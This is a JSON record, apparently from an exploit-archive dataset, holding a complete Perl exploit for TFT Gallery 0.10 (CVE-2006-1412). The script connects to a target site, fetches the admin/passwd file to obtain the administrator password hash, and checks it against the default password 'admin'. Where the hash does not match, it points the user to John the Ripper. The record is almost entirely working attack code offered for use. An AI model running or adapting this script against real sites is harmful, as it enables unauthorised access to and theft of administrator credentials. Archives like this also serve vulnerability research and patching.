{
  "id": "1611",
  "title": "TFT Gallery 0.10 - Password Disclosure",
  "cve": "CVE-2006-1412",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n###############################################################################\r\n#Copyright (C) undefined1_\r\n#\r\n#This program is free software; you can redistribute it and/or\r\n#modify it under the terms of the GNU General Public License\r\n#as published by the Free Software Foundation; either version 2\r\n#of the License, or (at your option) any later version.\r\n#\r\n#This program is distributed in the hope that it will be useful,\r\n#but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n#GNU General Public License for more details.\r\n#\r\n#You should have received a copy of the GNU General Public License\r\n#along with this program; if not, write to the Free Software\r\n#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\r\n#\r\n###############################################################################\r\n\r\nuse strict; \r\nuse IO::Socket;\r\n\r\n$| = 1;\r\nprintf \":: tftgallery 0.10 exploit - by undefined1_ @ bash-x.net/undef/ ::\\n\\n\\n\";\r\n\r\n\r\nmy $website = shift || usage();\r\n\r\nmy $path = \"/\";\r\nmy $site = $website;\r\nif(index($website, \"/\") != -1)\r\n{\r\n\tmy $index = index($website, \"/\");\r\n\t$path = substr($website, $index);\r\n\t$site = substr($website, 0, $index);\r\n\tif(substr($path, length($path)-1) ne \"/\")\r\n\t{\r\n\t\t$path .= \"/\";\r\n\t}\r\n}\r\n\r\n\r\nmy $eop = \"\\r\\nHost: $site\\r\\n\";\r\n$eop .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n$eop .= \"Connection: close\\r\\n\\r\\n\";\r\n\r\n\r\nmy $packet1 = \"GET \".$path.\"admin/passwd HTTP/1.1\";\r\nmy $data = sendpacket($site, $packet1.$eop);\r\n\r\nif($data !~ /HTTP\\/1.1 200 OK/)\r\n{\r\n\tdie \"failed to retrieve the admin password\\n\";\r\n}\r\n\r\nmy $password = \"\";\r\nif (index($data, \"\\r\\n\\r\\n\") != -1)\r\n{\r\n\t$password = substr($data, index($data, \"\\r\\n\\r\\n\")+4);\r\n\tchomp $password;\r\n}\r\nelse\r\n{\r\n\tdie \"failed to retrieve the admin password\\n\";\r\n}\r\n\r\nprint \"The password hash is: '$password'\\n\";\r\nif(crypt(\"admin\",\"tftgallery\") eq $password)\r\n{\r\n\tprint \"The plaintext password is: 'admin'\\n\";\t\t\r\n}\r\nelse\r\n{\r\n\tdie \"Use john the ripper, luke!\\n\";\r\n}\r\n\r\n\r\n\r\n\r\nsub sendpacket(\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $request = shift;\r\n\r\n\tmy $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $server, PeerPort => \"80\") or die \"[-] Could not connect to $server:80 $!\\n\";\r\n\tprint $sock \"$request\";\r\n\r\n\t\r\n\tmy $data = \"\";\r\n\tmy $answer;\r\n\twhile($answer = <$sock>)\r\n\t{\r\n\t\t$data .= $answer;\r\n\t}\r\n\t\r\n\tclose($sock);\r\n\treturn $data;\r\n}\r\n\r\nsub usage() {\r\n\tprintf \"usage: %s <website> [password]\\n\", $0;\r\n\tprintf \"ex. : %s www.site.com/tftgallery/\\n\", $0;\r\n\texit;\r\n}\r\n\r\n# milw0rm.com [2006-03-25]",
  "url": "https://www.exploit-db.com/exploits/1611"
}